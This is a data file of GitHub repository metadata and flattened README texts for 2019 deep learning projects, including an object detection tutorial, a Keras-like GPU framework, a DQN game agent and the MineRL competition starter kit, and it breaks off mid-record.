jiankaiwang,object_detection_tutorial,keras#keras-tutorials#object-detection#tensorflow#tensorflow-tutorials,Object Detection Tutorial The tutorial is designed for object detection via deep learning Object detection is one of the elementary issues in the field of image analysis In this tutorial we not only introduce the algorithm from the traditional computer vision to the latest deep learning but also implement those bringing impacts on this field In this tutorial we mainly use Tensorflow and Keras or Tensorflow Keras as the implementation tool In addition we also cover several APIs or frameworks associated with object detection Tensorflow Object Detection API Darkflow The document to this repository Google Docs https docs google com presentation d 1ZDZ8eWlH5jfTHYkFVBd1As1VgHFSnt0AjR6tY kAkU edit usp sharing Content We use the algorithm as the topics One Shot Solution YOLO v1 Tiny YOLO Notebook yolov1 Divide and Conquer Solution Faster RCNN using Tensorflow Object Detection API Notebook fasterrcnn,2019-08-22T15:36:37Z,2019-08-22T22:36:48Z,Jupyter Notebook,jiankaiwang,User,1,1,1,0,master,,0,0,0,0,0,0,0
HirushaR,epic_num_reader,n/a,mnist is basic datasets is it datasets that contain 28 28 size images of hand written digits 0 9 this is first tensorflow tutorila they provide but with some changes predicted and draw the predicted number Requirements Tensorflow pip install tensorflow nampy pip install nampy matplotlib pip install matplotlib Contributor Hirushar Randunu hirusharandunu11 gmail com License copyright Hirusha Randunu Undegraduate student of NSBM green university town Licensed under theMIT License,2019-09-13T16:39:03Z,2019-09-15T05:23:49Z,Python,HirushaR,User,0,1,0,4,master,HirushaR,1,0,0,0,0,0,0
lev1khachatryan,ASDS_DL,image-classification#neural-network#python#speech-recognition#stochastic-optimizers#tensorflow,Deep Learning 1 Intro to supervised learning 2 Overfitting underfitting 3 What is a neural network 4 Gradient Descent 5 Linear Regression Logistic Regression 6 Activation functions 7 Softmax classifier 8 Data normalization 9 Back propagation 10 Random Initialization 11 Regularization 12 Dropout 13 Batch normalization 14 Data augmentation 15 Vanishing Exploding gradients 16 Mini batch gradient descent 17 Gradient descent with momentum 18 RMSprop 19 Adam optimization algorithm 20 Learning rate tricks 21 Batch normalization 22 Introduction to TensorFlow 23 Convolutional neural networks 24 ResNets 25 Inceptions 26 VGG 27 Transfer learning 28 Autoencoders 29 GANs 30 Multitask learning 31 Basic Recurrent Neural Networks 32 GRU 33 LSTM 34 Bidirectional RNN 35 Multicell RNNs 36 Attention models 37 Bayesian neural networks 38 Word2vec 39 Sequence to sequence models 40 GPU optimisations for Neural Networks,2019-09-03T07:29:30Z,2019-12-14T04:48:44Z,Jupyter Notebook,lev1khachatryan,User,1,1,0,184,master,lev1khachatryan,1,0,0,0,0,0,0
eLeVeNnN,shinnosuke-gpu,n/a,Shinnosuke GPU Deep Learning Framework Descriptions Shinnosuke is a high level neural network which API almost identity to Keras with slightly differences It was written by Python only and dedicated to realize experimentations quickly Here are some features of Shinnosuke 1 Based on Cupy GPU version and native to Python 2 Without any other 3rd party deep learning library 3 Keras like API several basic AI Examples are provided easy to get start 4 Support commonly used models such as Dense Conv2D MaxPooling2D LSTM SimpleRNN etc 5 Sequential model for most sequence network combinations and Functional model for resnet etc are implemented 6 Training is conducted on forward graph and backward graph 7 Autograd is supported Shinnosuke is compatible with Python 3 x 3 6 is recommended Getting started The core networks of Shinnosuke is a model which provide a way to combine layers There are two model types Sequential a linear stack of layers and Functional build a graph for layers Here is a example of Sequential model python from shinnosuke models import Sequential m Sequential Using add to connect layers python from shinnosuke models import Dense m add Dense nout 500 activation relu nin 784 must be specify nin if current layer is the first layer of model m add Dense nout 10 activation softmax no need to specify nin as shinnosuke will automatic calculate the input and output shape Here are some differences with Keras nout and nin are named units and inputdim in Keras respectively Once you have constructed your model you should configure it with compile before training python m compile loss sparsecategoricalcrossentropy optimizer sgd If you apply softmax to multi classify task and your labels are one hot encoded vectors matrix you shall specify loss as sparsecategoricalcrossentropy otherwise use categoricalcrossentropy While in Keras categoricalcrossentropy supports for one hot encoded labels And Shinnosuke model only supports one metrics accuracy which no need to specify in compile You can further configure your optimizer by passing more parameters python m compile loss shinnosuke Objectives SparseCategoricalCrossEntropy optimizer sgd learningrate 0 01 epsilon 1e 8 Having finished compile you can start training your data in batches python trainX and trainy are Numpy arrays for 2 dimension data trainX s shape should be trainingnums inputdim m fit trainX trainy batchsize 128 epochs 5 validationratio 0 drawaccloss True By specify validationratio 0 0 1 0 shinnosuke will split validation data from training data according to validationratio otherwise validationratio 0 means no validation data Alternatively you can feed validationdata manually python m fit trainX trainy batchsize 128 epochs 5 validationdata validX validy drawaccloss True If drawaccloss True a dynamic updating figure will be shown in the training process like below Evaluate your model performance by evaluate python acc loss m evaluate testX testy batchsize 128 Or obtain predictions on new data python yhat m predict xtest For Functional model first instantiate an Input layer python from shinnosuke layers Base import Input Xinput Input shape None 1 28 28 batchsize channels height width You need to specify the input shape notice that for Convolutional networks data s channels must be in the axis 1 instead of 1 and you should state batchsize as None which is unnecessary in Keras Then Combine your layers by functional API python from shinnosuke models import Model from shinnosuke layers Convolution import Conv2D MaxPooling2D from shinnosuke layers Activation import Activation from shinnosuke layers Normalization import BatchNormalization from shinnosuke layers FC import Flatten Dense X Conv2D 8 2 2 padding VALID initializer normal activation relu Xinput X MaxPooling2D 2 2 X X Flatten X X Dense 10 initializer normal activation softmax X model Model inputs Xinput outputs X model compile optimizer sgd loss sparsecategoricalcrossentropy model fit trainX trainy batchsize 256 epochs 80 validationratio 0 Pass inputs and outputs layer to Model and then compile and fit model like Sequential model Building an image classification model a question answering system or any other model is just as convenient and fast In the Examples folder https github com eLeVeNnN shinnosuke Examples of this repository you can find more advanced models waiting to implement Both dynamic and static graph features As you will see soon in below Shinnosuke has two basic classes Layer and Node For Layer operations between layers can be described like this here gives an example of py from shinnosuke layers Base import Input Add from shinnosuke layers FC import Dense X Input shape 3 5 Xshortcut X X Dense 5 X Dense will output a 3 5 tensor X Add Xshortcut X Meanwhile Shinnosuke will construct a graph as below While Node Operations have both dynamic graph and static graph features python from shinnosuke layers Base import Variable x Variable 3 y Variable 5 z x y print z getvalue You suppose get value 8 at same time shinnosuke construct a graph as below Autograd What is autograd In a word It means automatically calculate the network s gradients without any prepared backward codes for users Shinnosuke s autograd supports for several operators such as etc Here gives an example For a simple fully connected neural network you can use Dense to construct it python from shinnosuke models import Sequential from shinnosuke layers FC import Dense import cupy as cp announce a Dense layer fullyconnected Dense 4 nin 5 m Sequential m add fullyconnected m compile optimizer sgd loss mse not mean to train it use compile to initialize parameters initialize inputs cp random seed 0 X cp random rand 3 5 feed X as fullyconnected s inputs fullyconnected feed X inputs forward fullyconnected forward out1 fullyconnected print out1 getvalue feed gradient to fullyconnected fullyconnected feed cp oneslike out1 grads backward fullyconnected backward W b fullyconnected variables print W grads We can also construct the same layer by using following codes python from shinnosuke layers Base import Variable a Variable X the same as X in previous fullyconnected c Variable W getvalue the same as W in previous fullyconnected d Variable b getvalue the same as b in previous fullyconnected out2 a c d represents for matmul print out2 getvalue out2 grads cp oneslike out2 getvalue by using grad shinnosuke will automatically calculate the gradient from out2 to c c grad print c grads Guess what out1 has the same value of out2 and so did W and c s grads This is the magic autograd of shinnosuke By using this feature users can implement other networks as wishes without writing any backward codes See autograd example in Here Installation Before installing Shinnosuke please install the following dependencies Cupy 6 0 0 recommend matplotlib 3 0 3 recommend Then you can install Shinnosuke by using pip pip install shinnosuke gpu Installation from Github source will be supported in the future Supports Two basic class Layer Dense Conv2D MaxPooling2D MeanPooling2D Activation Input Dropout BatchNormalization LayerNormalization GroupNormalization TimeDistributed SimpleRNN LSTM GRU waiting for implemented ZeroPadding2D Operations includes Add Minus Multiply Matmul and so on basic operations for Layer and Node Node Variable Constant Optimizers StochasticGradientDescent Momentum RMSprop AdaGrad AdaDelta Adam Waiting for implemented more Objectives MeanSquaredError MeanAbsoluteError BinaryCrossEntropy SparseCategoricalCrossEntropy CategoricalCrossEntropy Activations Relu Linear Sigmoid Tanh Softmax Initializations Zeros Ones Uniform LecunUniform GlorotUniform HeUniform Normal LecunNormal GlorotNormal HeNormal Orthogonal Regularizes waiting for implement Utils getbatches generate mini batch tocategorical convert inputs to one hot vector matrix concatenate concatenate Nodes that have the same shape in specify axis padsequences pad sequences to the same length,2019-08-07T12:53:08Z,2019-09-12T06:52:18Z,Python,eLeVeNnN,User,1,1,1,24,master,eLeVeNnN,1,0,0,0,0,0,0
yzheng51,rl-dino-run,n/a,rl dino run This project aims to Creates an agent to play T rex Runner Compares the performance of different algorithms Investigate the effect of batch normalization T rex Runner This game environment is based on this repo https github com elvisyjlin gym chrome dino and modify the reward function and preprocessing steps To simplify the decision there are only two actions in action space Jump Do nothing alt text images dino run png T rex Runner Hyperparameter Tuning There are many hyperparameters in Reinforcement Learning In this project we assume each hyperparameter is independent from others so that we can tune them one by one Below table shows all parameters after tune Hyperparameter Value Memory Size 3 10 5 Batch Size 128 Gamma 0 99 Initial epsilon 1 10 1 Final epsilon 1 10 4 Explore steps 1 10 5 Learning Rate 2 10 5 Four example tuning process on learning rate batch size epsilon gamma alt text images param tune png T rex Runner Training Results Comparison of different DQN algorithms Using tuned hyperparameters run 200 epochs Prioritized Experience Replay shows pretty bad effect because of weight update which is very time consuming and the game will keep runing when updating weight alt text images train result png T rex Runner Comparison between DQN and DQN with Batch Normalization alt text images train result bn png T rex Runner Statistical Results Algorithm Mean Std Max 25 50 75 Time h DQN 537 50 393 61 1915 195 75 481 820 25 87 Double DQN 443 31 394 01 2366 97 75 337 662 25 21 36 Dueling DQN 839 04 1521 40 25706 155 457 956 5 35 78 DQN with PER 43 50 2 791 71 43 43 43 3 31 DQN BN 777 54 917 26 8978 97 75 462 5 1139 25 32 59 Double DQN BN 696 43 758 81 5521 79 430 5 1104 25 29 40 Dueling DQN BN 1050 26 1477 00 14154 84 541 5 1520 40 12 DQN with PER BN 46 14 7 54 98 43 43 43 3 44 Testing Results In testing stage each algorithm uses the latest model and run 30 times Boxplot of all cases alt text images test result png T rex Runner Statistical Results Algorithm Mean Std Min Max 25 50 75 Human 1121 9 499 91 268 2384 758 992 5 1508 5 DQN 1161 30 814 36 45 3142 321 5 1277 1729 5 Double DQN 340 93 251 40 43 942 178 75 259 5 400 75 Dueling DQN 2383 03 2703 64 44 8943 534 75 1499 5 2961 DQN with PER 43 30 1 64 43 52 43 43 43 DQN BN 2119 47 1595 49 44 5823 1218 75 1909 5 2979 75 Double DQN BN 382 17 188 74 43 738 283 75 356 525 5 Dueling DQN BN 2083 37 1441 50 213 5389 1142 5 1912 5 2659 75 DQN with PER BN 45 43 7 384 43 78 43 43 43 References DQN paper https storage googleapis com deepmind data assets papers DeepMindNature14236Paper pdf code agent py L19 L136 Double DQN paper https arxiv org pdf 1509 06461 pdf code agent py L150 L168 Dueling DQN paper https arxiv org pdf 1511 06581 pdf code agent py L139 L147 DQN with Prioritized Experience Replay paper https arxiv org pdf 1511 05952 pdf code agent py L171 L209 Batch Normalization paper https arxiv org pdf 1502 03167 pdf,2019-09-01T21:00:19Z,2019-10-11T16:20:30Z,Python,yzheng51,User,1,1,0,11,master,yzheng51,1,0,0,1,0,1,0
WJohnnyW,Classic_Papers,n/a,ClassicPapers Classic papers for Deep Learning amp amp Computer Vision amp amp Artificial Intelligence,2019-08-20T02:11:05Z,2019-08-20T03:01:39Z,n/a,WJohnnyW,User,1,1,0,3,master,WJohnnyW,1,0,0,0,0,0,0
macabdul9,emoji-prediction-using-recurrent-neural-networks,deep-learning#emoji-prediction#lstm-neural-networks#natural-language-processing#recurrent-neural-networks#sentiment-analysis,emoji prediction using recurrent neural networks predicting emoji for given sentence using deep learning,2019-08-18T08:49:35Z,2019-08-20T19:24:45Z,Jupyter Notebook,macabdul9,User,1,1,1,3,master,macabdul9,1,0,0,0,0,0,0
twistfatezz,Convolutional_network_matlab,n/a,6 m mnist m LeNet5 m load mat totaldata load xxxx mnist mat 8 544975e 02 seconds 8 956718e 00 seconds,2019-09-04T15:02:53Z,2019-09-04T15:05:21Z,MATLAB,twistfatezz,User,1,1,0,1,master,twistfatezz,1,0,0,0,0,0,0
Onirael,DLMotionBlur,n/a,DLMotionBlur,2019-09-02T19:50:34Z,2019-11-02T03:37:38Z,Python,Onirael,User,1,1,0,64,master,Onirael,1,0,0,0,0,0,0
DrLux,AdvantageActorCritic-A2C-,n/a,AdvantageActorCritic A2C Implementation of A2C Model Free Deep Reinforcement Learning Algorithm,2019-08-20T16:18:18Z,2019-09-10T07:32:00Z,Python,DrLux,User,1,1,0,11,master,DrLux,1,0,0,0,0,0,0
riiaa,DLaaS_19,n/a,DLaaS media banner png GitHub last commit https img shields io github last commit RodolfoFerro RIIAA19 DLaaS style for the badge GitHub repo size https img shields io github repo size RodolfoFerro RIIAA19 DLaaS style for the badge GitHub https img shields io github license RodolfoFerro RIIAA19 DLaaS style for the badge Slides https img shields io static v1 label Slides message Google 20Slides color tomato style for the badge https docs google com presentation d e 2PACX 1vQu3NcX5En0X4fd65 jziWHvPmkU1tUNQurw3lAgfcEHNwtmsaLg4zrE5AKwkYb0cshCXM0p55Is47p pub start false loop false delayms 3000 Contenido del taller El taller fue desarrollado exclusivamente para su uso durante la Escuela de Verano de la RIIAA 2 0 y debe estar autocontenido lo que significa que con este documento explicativo debe bastar para poder seguir y desarrollar el contenido del taller Grosso modo el contenido cubierto a lo largo del taller es el siguiente Motivacin 0 2 hrs Requisitos y setup 0 4 hrs Intro al mundo del Deep Learning 1 5 hrs Funcionamiento de APIs 2 5 hrs Requests Consumo de APIs con Python Flask Microframework web de Python Cmo servimos modelos de IA 4 hrs Puedes encontrar los slides en vivo AQU https docs google com presentation d e 2PACX 1vQu3NcX5En0X4fd65 jziWHvPmkU1tUNQurw3lAgfcEHNwtmsaLg4zrE5AKwkYb0cshCXM0p55Is47p pub start false loop false delayms 3000 Es importante mencionar que el curso har uso de un ambiente en la nube y uno local para el desarrollo del material por lo que te recomendamos apoyarte de los ayudantes del curso para la instalacin de Pythony todos los requerimientos Instrucciones para estudiantes La mayora de las prcticas de los talleres se desarrollarn en Python 3 7 usando la biblioteca Tensorflow 2 0 https www tensorflow org que adopta Keras https www tensorflow org versions r2 0 apidocs python tf keras como interfaz de alto nivel para construir y entrenar redes neuronales Requerimientos Una laptop Este repositorio de GitHub clonado y actualizado antes del taller Un sentido aventurero en los datos Un ambiente Python 3 7 con Anaconda ver opciones 1 y 2 abajo Los talleres sern impartidos usando notebooks de Jupyter documentos con cdigo ejecutable texto ecuaciones visualizaciones imgenes y dems material Los notebooks se pueden crear y ejecutar en la nube va Google Colab opcin 1 o de manera local en tu computadora a travs de Jupyter Notebooks o JupyterLab https jupyter org opcin 2 Opcion 1 Google Colab Colab https colab research google com es un servicio de Google para ejecutar notebooks en la nube Provee ambientes de Python 2 y 3 con CPUs GPUs y TPUs Y es gratis Solo necesitas tener una cuenta de Google o crear una Recomendamos que elijas un ambiente con Python 3 y GPU Para activarlo Abre el men Entorno de ejecucin Elige la opcin Restablecer todos los entornos de ejecucin Vuelve a abrir Entorno de ejecucin Elige Cambiar tipo de entorno de ejecucin Selecciona Python 3 como Tipo de ejecucin y GPU de la lista de Acelerador por hardware La siguiente captura de pantalla ilustra este proceso media escogeacelerador png En Colab https colab research google com puedes crear un nuevo notebook subir uno existente desde tu computadora o importarlo de Google Drive o GitHub Opcion 2 Ambiente local Para tener la versin de Python 3 7 aadido Python al PATH y todas las bibliotecas instaladas en cualquier plataforma recomendamos que uses Anaconda https www anaconda com y generes un ambiente con el archivo environment yml de este repositorio usando una terminal y el comando bash conda env create n riiaa19 f environment yml Cambia el nombre riia19 por tu nombre favorito para el ambiente o puedes remover la bandera n riia19 para dejar el nombre default del ambiente DLaaS Para activar el ambiente que creaste en una terminal ingresa el comando bash conda activate riiaa19 O en su defecto conda activate DLaaS Una vez activado puedes ejecutar la aplicacin de Jupyter Notebook bash jupyter notebook O de JupyterLab bash jupyter lab Este ltimo comando abrir una pestaa o ventana en tu navegador web como se muestra en la siguiente captura de pantalla media jupyterlab png Al igual que en Google Colab puedes crear un nuevo notebook seleccionando el botn New y posteriormente Python 3 De forma alternativa puedes abrir uno existente seleccionando el archivo del notebook con extensin ipynb dentro del directorio donde ejecutaste Jupyter Notebook Con el botn Upload agregas archivos que se encuentran en otra parte de tu computadora a este directorio Para cerrar Jupyter Notebook presiona el botn Quit y posteriormente cierra la pestaa o ventana de tu navegador web Para desactivar el ambiente riiaa19 de Anaconda simplemente haz conda deactivate Atribuciones Este repositorio cuenta con una MIT License https github com RodolfoFerro RIIAA19 DLaaS blob master LICENSE Los conos creados por DinosoftLabs https www flaticon com authors dinosoftlabs y Flat Icons https www flaticon com authors flat icons de cuentan con una licencia CC 3 0 BY http creativecommons org licenses by 3 0,2019-09-02T20:02:20Z,2019-09-09T23:15:28Z,Jupyter Notebook,riiaa,Organization,2,1,0,18,master,RodolfoFerro,1,0,0,0,0,0,0
ang3loliveira,bsidessp16,n/a,,2019-08-10T09:43:19Z,2019-10-23T07:35:44Z,n/a,ang3loliveira,User,1,1,0,1,master,ang3loliveira,1,0,0,0,0,0,0
maxbos,rlpack,n/a,rlpack PyTorch library for performing Deep Reinforcement Learning experiments Note that this is a work in progress and should be used in a development environment,2019-09-15T18:44:34Z,2019-09-17T08:02:45Z,Python,maxbos,User,1,1,0,1,master,maxbos,1,0,0,0,0,0,0
rayanht,speech2text,n/a,speech2textML A deep learning powered speech to text service,2019-09-03T23:48:39Z,2019-11-21T17:23:20Z,Python,rayanht,User,1,1,0,15,master,rayanht,1,0,0,0,0,0,0
chengyu2,mine_rl,n/a,NeurIPS 2019 MineRL Competition Starter Kit Discourse status https img shields io discourse https discourse aicrowd com status svg https discourse aicrowd com Discord https img shields io discord 565639094860775436 svg https discord gg BT9uegr This repository is the main MineRL Competition submission template and starter kit Compete to solve MineRLObtainDiamond v0 now This repository contains Documentation on how to submit your agent to the leaderboard The procedure for Round 1 how long you should train your agent how we evaluate and re train your agent etc Starter code for you to base your submission Other Resources MineRL Competition Page https www aicrowd com challenges neurips 2019 minerl competition Main registration page leaderboard MineRL Documentation http minerl io docs Documentation for the minerl package and dataset Example Baselines https github com minerllabs baselines A set of competition and non competition baselines for minerl https i imgur com XB1WORT gif Competition Procedure Round 1 Welcome to Round 1 The main task of the competition is solving the MineRLObtainDiamond v0 environment In this environment the agent begins in a random starting location without any items and is tasked with obtaining a diamond This task can only be accomplished by navigating the complex item hierarchy of Minecraft In this round you will train your agents locally with a limited number of samples and then upload them to AIcrowd via git to be evaluated and retrained by the organizers The following is a high level description of how this round works http minerl io assets images round1procedure png 1 Sign up to join the competition on the AIcrowd website https www aicrowd com challenges neurips 2019 minerl competition 2 Clone this repo and start developing your submissions 3 Train your models against MineRLObtainDiamond v0 using the trainlocally sh or on Azure with only 8 000 000 samples in less than four days using hardware no powerful than a NG6v2 instance 6 CPU cores 112 GiB RAM 736 GiB SDD and a single NVIDIA P100 GPU 3 Submit your trained models to AIcrowd Gitlab https gitlab aicrowd com for evaluation full instructions below The automated evaluation setup will evaluate the submissions against the validation environment to compute and report the metrics on the leaderboard of the competition Once Round 1 is complete the organizers will 1 Examine the code repositories of the top submissions on the leaderboard to ensure compliance with the competition rules 2 Retrain the top submissions from scratch to ensure reproducibility of the leaderboard score NOTE Make sure that you train your models in UNDER 8 000 000 samples using a similar or worse hardware spec than above so that you are not disqualified for a score mismatch 2 Evaluate the resulting models again over several hundred episodes to determine the final ranking The code repositories associated with the corresponding submissions will be forked and scrubbed of any files larger than 15MB to ensure that participants are not using any pre trained models in the subsequent round How to Submit a Model Setup 1 Clone the github repository or press the Use this Template button on GitHub git clone https github com minerllabs competitionsubmissionstartertemplate git 2 Install competition specific dependencies Make sure you have the JDK 8 installed first http minerl io docs tutorials gettingstarted html 1 Make sure to install the JDK first Go to http minerl io docs tutorials gettingstarted html 2 Install the minerl package and the dependencies for the competition cd competitionsubmissionstartertemplate pip3 install r requirements txt 3 Specify your specific submission dependencies PyTorch Tensorflow kittens etc Optional Anaconda Environment If you would like to use anaconda to manage your environment make sure at least version 4 5 11 is required to correctly populate environment yml By following instructions here https www anaconda com download Then Create your new conda environment sh conda create name minerlchallenge conda activate minerlchallenge Your code specific dependencies sh conda install Pip Packages If you are using specific Python packages make sure to add them to requirements txt Here s an example requirements txt minerl 0 2 3 matplotlib tensorflow Apt Packages If your training procedure or agent depends on specific Debian Ubuntu etc packages add them to apt txt How do I specify my software runtime As mentioned above the software runtime is specified in 3 places environment yml The optional Anaconda environment specification As you add new requirements you can export your conda environment to this file conda env export no build environment yml requirements txt The pip3 packages used by your agent to train Note that dependencies specified by environment yml take precedence over requirements txt As you add new pip3 packages to your training procedure either manually add them to requirements txt or if your software runtime is simple perform Put ALL of the current pip3 packages on your system in the submission pip3 freeze requirements txt apt txt The Debian packages via aptitude used by your training procedure These files are used to construct both the local and AICrowd docker containers in which your agent will train What should my code structure be like Please follow the example structure shared in the starter kit for the code structure The different files and directories have following meaning aicrowd json Submission meta information like your username apt txt Packages to be installed inside docker image data The downloaded data the path to directory is also available as MINERLDATAROOT env variable requirements txt Python packages to be installed test py IMPORTANT Your testing inference phase code must include main method train Your trained model MUST be saved inside this directory must include main method train py IMPORTANT Your training phase code utility The utility scripts to provide smoother experience to you debugbuild sh dockerrun sh environ sh evaluationlocally sh parser py trainlocally sh verifyordownloaddata sh Finally you must specify an AIcrowd submission JSON in aicrowd json to be scored The aicrowd json of each submission should contain the following content json challengeid aicrowd neurips 2019 minerl challenge graderid aicrowd neurips 2019 minerl challenge authors your aicrowd username description sample description about your awesome agent license MIT gpu true This JSON is used to map your submission to the said challenge so please remember to use the correct challengeid and graderid as specified above Please specify if your code will use a GPU or not for the evaluation of your model If you specify true for the GPU a NVIDIA Tesla K80 GPU will be provided and used for the evaluation Dataset location You don t need to upload the data set in submission and it will be provided in online submissions at MINERLDATAROOT path For local training and evaluations you can download it once in your system via python utility verifyordownloaddata py or place manually into data folder Training and Testing Code Entrypoint where you write your code The evaluator will use train py and test py as the entrypoint for training and testing inference stage respectively so please remember to include the files in your submission The inline documentation in these files will guide you in interfacing with evaluator properly IMPORTANT Saving Models during Training Before you sbumit make sure that your code does the following During training train py save your models to the train folder During testing test py load your model from the train folder It is absolutely imperative that you save your models during training train py so that they can be used in the evaluation phase test py on AICrowd and so the oraganizers can retrain your models from scratch at the end of Round 1 and during Round 2 How to submit a trained agent To make a submission you will have to create a private repository on https gitlab aicrowd com https gitlab aicrowd com You will have to add your SSH Keys to your GitLab account by following the instructions here https docs gitlab com ee gitlab basics create your ssh keys html If you do not have SSH Keys you will first need to generate one https docs gitlab com ee ssh README html generating a new ssh key pair Then you can create a submission by making a tag push to your repository on https gitlab aicrowd com https gitlab aicrowd com Any tag push where the tag name begins with submission to your private repository is considered as a submission Then you can add the correct git remote and finally submit by doing cd competitionsubmissionstartertemplate Add AIcrowd git remote endpoint git remote add aicrowd git gitlab aicrowd com competitionsubmissionstartertemplate git git push aicrowd master Create a tag for your submission and push git tag am submission v0 1 submission v0 1 git push aicrowd master git push aicrowd submission v0 1 Note If the contents of your repository latest commit hash does not change then pushing a new tag will not trigger a new evaluation You now should be able to see the details of your submission at gitlab aicrowd com competitionsubmissionstartertemplate issues gitlab aicrowd com competitionsubmissionstartertemplate issues NOTE Remember to update your username in the link above wink In the link above you should start seeing something like this take shape each of the steps can take a bit of time so please be patient too wink https i imgur com FqScw4m png and if everything works out correctly then you should be able to see the final scores like this https i imgur com u00qcif png Best of Luck tada tada Other Concepts Time constraints Round 1 You have to train your models locally with under 8 000 000 samples and with worse or comprable hardware to that above and upload the trained model in train directory But to make sure your training code is compatible with further round s interface the training code will be executed in this round as well The constraints will be timeout of 5 minutes Round 2 You are expected to train your model online using the training phase docker container and output the trained model in train directory You need to ensure that your submission is trained in under 8 000 000 samples and within 4 days period Otherwise the container will be killed Local evaluation You can perform local training and evaluation using utility scripts shared in this directory To mimic the online training phase you can run utility trainlocally sh from repository root you can specify verbose for complete logs aicrowdminerlstarterkit utility trainlocally sh verbose 2019 07 22 07 58 38 root 77310 INFO Training Start 2019 07 22 07 58 38 crowdaiapi events 77310 DEBUG Registering crowdAI API Event CROWDAIEVENTINFO trainingstarted eventtype minerlchallenge trainingstarted withoracle False 2019 07 22 07 58 40 minerl env malmo instance 17c149 77310 INFO Starting Minecraft process var folders 82 wsds18s5dq321scc1j531m40000gn T tmpnyzpjrsc Minecraft launchClient sh port 9001 env runDir var folders 82 wsds18s5dq321scc1j531m40000gn T tmpnyzpjrsc Minecraft run 2019 07 22 07 58 40 minerl env malmo instance 17c149 77310 INFO Starting process watcher for process 77322 localhost 9001 2019 07 22 07 58 48 minerl env malmo instance 17c149 77310 DEBUG This mapping snapshot20161220 was designed for MC 1 11 Use at your own peril 2019 07 22 07 58 48 minerl env malmo instance 17c149 77310 DEBUG 2019 07 22 07 58 48 minerl env malmo instance 17c149 77310 DEBUG ForgeGradle 2 2 SNAPSHOT 3966cea 2019 07 22 07 58 48 minerl env malmo instance 17c149 77310 DEBUG https github com MinecraftForge ForgeGradle 2019 07 22 07 58 48 minerl env malmo instance 17c149 77310 DEBUG 2019 07 22 07 58 48 minerl env malmo instance 17c149 77310 DEBUG Powered by MCP unknown 2019 07 22 07 58 48 minerl env malmo instance 17c149 77310 DEBUG http modcoderpack com 2019 07 22 07 58 48 minerl env malmo instance 17c149 77310 DEBUG by Searge ProfMobius Fesh0r 2019 07 22 07 58 48 minerl env malmo instance 17c149 77310 DEBUG R4wk ZeuX IngisKahn bspkrs 2019 07 22 07 58 48 minerl env malmo instance 17c149 77310 DEBUG 2019 07 22 07 58 48 minerl env malmo instance 17c149 77310 DEBUG Found AccessTransformer malmomodat cfg 2019 07 22 07 58 49 minerl env malmo instance 17c149 77310 DEBUG deobfCompileDummyTask 2019 07 22 07 58 49 minerl env malmo instance 17c149 77310 DEBUG deobfProvidedDummyTask For local evaluation of your code you can use utility evaluationlocally sh add verbose if you want to view complete logs aicrowdminerlstarterkit utility evaluationlocally sh state RUNNING score score 0 0 scoresecondary 0 0 instances 1 totalNumberSteps 1001 totalNumberEpisodes 0 currentEnvironment MineRLObtainDiamond v0 state INPROGRESS episodes numTicks 1001 environment MineRLObtainDiamond v0 rewards 0 0 state INPROGRESS score score 0 0 scoresecondary 0 0 state RUNNING score score 0 0 scoresecondary 0 0 instances 1 totalNumberSteps 2001 totalNumberEpisodes 0 currentEnvironment MineRLObtainDiamond v0 state INPROGRESS episodes numTicks 2001 environment MineRLObtainDiamond v0 rewards 0 0 state INPROGRESS score score 0 0 scoresecondary 0 0 state RUNNING score score 0 0 scoresecondary 0 0 instances 1 totalNumberSteps 3001 totalNumberEpisodes 0 currentEnvironment MineRLObtainDiamond v0 state INPROGRESS episodes numTicks 3001 environment MineRLObtainDiamond v0 rewards 0 0 state INPROGRESS score score 0 0 scoresecondary 0 0 state RUNNING score score 0 0 scoresecondary 0 0 instances 1 totalNumberSteps 4001 totalNumberEpisodes 0 currentEnvironment MineRLObtainDiamond v0 state INPROGRESS episodes numTicks 4001 environment MineRLObtainDiamond v0 rewards 0 0 state INPROGRESS score score 0 0 scoresecondary 0 0 state RUNNING score score 0 0 scoresecondary 0 0 instances 1 totalNumberSteps 5001 totalNumberEpisodes 0 currentEnvironment MineRLObtainDiamond v0 state INPROGRESS episodes numTicks 5001 environment MineRLObtainDiamond v0 rewards 0 0 state INPROGRESS score score 0 0 scoresecondary 0 0 state RUNNING score score 0 0 scoresecondary 0 0 instances 1 totalNumberSteps 6001 totalNumberEpisodes 0 currentEnvironment MineRLObtainDiamond v0 state INPROGRESS episodes numTicks 6001 environment MineRLObtainDiamond v0 rewards 0 0 state INPROGRESS score score 0 0 scoresecondary 0 0 For running testing your submission in a docker environment ideantical to online submission you can use utility dockertrainlocally sh and utility dockerevaluationlocally sh You can also run docker image with bash entrypoint for debugging on the go with the help of utility dockerrun sh These scripts respect following parameters no build To skip docker image build and use the last build image nvidia To use nvidia docker instead of docker which include your nvidia related drivers inside docker image Team The quick start kit was authored by Shivam Khandelwal https twitter com skbly7 with help from William H Guss http wguss ml The competition is organized by the following team William H ,2019-09-12T09:18:19Z,2019-12-14T10:17:49Z,Jupyter Notebook,chengyu2,User,4,1,0,7,master,nikhil-mathew-td#slavachalnev#chengyu2,3,0,0,0,0,0,0
nggih,rustytorch,n/a,rustytorch Deep learning framework similar like PyTorch but in Rust,2019-08-14T16:45:10Z,2019-08-17T06:00:57Z,n/a,nggih,User,1,1,0,2,master,nggih,1,0,0,0,0,0,0
Manogna-Pagadala,Colon-Cancer-Nuclei-Detection,n/a,,2019-08-08T06:16:47Z,2019-08-17T12:05:55Z,Python,Manogna-Pagadala,User,1,1,0,1,master,Manogna-Pagadala,1,0,0,0,0,0,0
vaibhav369,natural-language-processing,deep-learning#deep-neural-networks#natural-language-processing#sequential-data#text-classification#text-generation,natural language processing Description This repository contains many sub projects I have pursued these projects as a means to learn natural language processing I have approached this field of natural language processing with only deep learning as the tool I do not have any linguistics knowledge and none of that has been used in any of the projects I believe and also as has been shown by many deep learning applications now that inputting in human knowledge may seem to be better at problem solving for a specific domain but in the long run letting the achines figure out the patterns for themselves works for the best One Piece Text Generation One Piece is one of the most loved anime series of all times Greatest story telling if you ask me So this project ties my love for the great anime and deep learning together I feed into the natural language processing algorithm the script for many many one piece episodes The algorithm learns relationship between a sequence of characters and the following character Basically it is a multi class classification problem We do not have very great results out of this yet But the project is still on Here are few snippets generated via natural language processing algorithm the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the sea whth the country which is the cesteen of the 